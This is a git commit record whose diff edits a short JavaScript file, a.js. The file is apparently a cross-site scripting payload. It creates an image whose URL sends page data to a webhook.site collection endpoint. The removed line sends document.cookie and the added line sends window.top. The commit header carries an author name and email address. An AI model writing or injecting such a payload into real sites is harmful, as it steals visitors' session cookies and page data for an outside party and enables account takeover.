da814fc24066a8a106e12cd220ed568f0f12ad88
carloszavaleta <czavaleta93@gmail.com>
2020-01-20 23:27:26 -0600

    as

--- a.js
+++ a.js
@@ -1,5 +1,6 @@
 var image = document.createElement("img")
 
-image.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/picture.png?c=" + document.cookie
+var name = window.top
+image.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/picture.png?c=" + name
 
 document.body.appendChild(image);
